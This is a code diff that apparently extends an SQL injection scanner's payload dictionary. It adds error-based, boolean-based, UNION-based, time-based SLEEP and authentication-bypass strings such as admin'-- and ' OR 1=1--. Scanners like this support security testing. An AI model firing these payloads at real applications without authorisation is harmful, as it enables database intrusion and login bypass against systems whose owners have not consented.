@@ -57,17 +57,44 @@ SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
 
 
 # SQL Injection payloads organized by category
-# OPTIMIZED: Only most effective payloads for fast detection
 SQLI_PAYLOADS: Dict[str, List[str]] = {
     "error_based": [
-        "'",                    # Single quote - most common
-        "'))--",               # Closing parens + comment
-        '")--',                # Double quote variant
+        "'",
+        "''",
+        '"',
+        "`",
+        ")",
+        "))",
+        "'))",
+        "'))--",
+        '")--',
+    ],
+    "boolean_based": [
+        "' AND '1'='1",
+        "' AND '1'='2",
+        "' OR '1'='1",
+        "' OR '1'='1'--",
+        "1 AND 1=1",
+        "1 AND 1=2",
+        "1 OR 1=1",
+    ],
+    "union_based": [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+    ],
+    "time_based": [
+        "' AND SLEEP(5)--",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
     ],
     "auth_bypass": [
-        "' OR '1'='1'--",      # Classic bypass
-        "admin'--",            # Admin login bypass
-        "') OR '1'='1--",      # Closing paren variant
+        "admin'--",
+        "admin' #",
+        "' OR 1=1--",
+        "' OR 1=1#",
+        ") OR '1'='1--",
+        "' OR '1'='1' --",
+        "'='' OR",
     ]
 }
 
